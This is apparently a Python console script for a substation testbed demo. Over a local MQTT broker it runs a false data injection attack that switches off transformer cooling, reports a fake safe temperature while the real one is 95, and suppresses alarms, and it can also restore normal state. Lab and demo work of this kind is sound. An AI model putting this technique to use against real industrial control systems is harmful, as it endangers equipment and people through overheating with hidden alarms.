#!/usr/bin/env python3
import time

import paho.mqtt.client as mqtt


BROKER_HOST = "localhost"
BROKER_PORT = 1883

MESSAGES_START = [
    ("substation/attack/type", "cooling_false_data"),
    ("substation/cooling/control", "OFF"),
    ("substation/sensor/temperature/fake", "42"),
    ("substation/transformer/temperature/real", "95"),
    ("substation/effect/smoke", "ON"),
    ("substation/alarm/suppression", "ON"),
]

MESSAGES_STOP = [
    ("substation/cooling/control", "ON"),
    ("substation/sensor/temperature/fake", "42"),
    ("substation/transformer/temperature/real", "45"),
    ("substation/effect/smoke", "OFF"),
    ("substation/alarm/suppression", "OFF"),
    ("substation/attack/type", "none"),
]


def print_menu() -> None:
    print()
    print("Cooling System + False Data Injection Attack")
    print("1 - Start Cooling False Data Attack")
    print("2 - Stop Attack / Restore Normal")
    print("q - Quit")


def publish_messages(messages: list[tuple[str, str]]) -> None:
    client = mqtt.Client(
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2,
        client_id="cooling-false-data-attack-console",
    )

    print(f"Connecting to MQTT broker {BROKER_HOST}:{BROKER_PORT}...")
    client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    client.loop_start()

    for topic, payload in messages:
        result = client.publish(topic, payload, qos=0)
        result.wait_for_publish()
        print(f"Published {topic} = {payload}")
        time.sleep(0.05)

    client.loop_stop()
    client.disconnect()


def start_attack() -> None:
    print("[Cooling FDI] Starting attack...")
    publish_messages(MESSAGES_START)
    print("[Cooling FDI] Attack messages sent.")


def stop_attack() -> None:
    print("[Cooling FDI] Restoring normal state...")
    publish_messages(MESSAGES_STOP)
    print("[Cooling FDI] Restore messages sent.")


def main() -> None:
    while True:
        print_menu()
        choice = input("Select command type: ").strip().lower()

        if choice in {"q", "quit", "exit"}:
            print("Exiting cooling false data attack console.")
            break

        try:
            if choice == "1":
                start_attack()
            elif choice == "2":
                stop_attack()
            else:
                print("Invalid selection. Use 1, 2, or q.")
        except Exception as exc:
            print(f"Publish failed: {exc}")


if __name__ == "__main__":
    main()
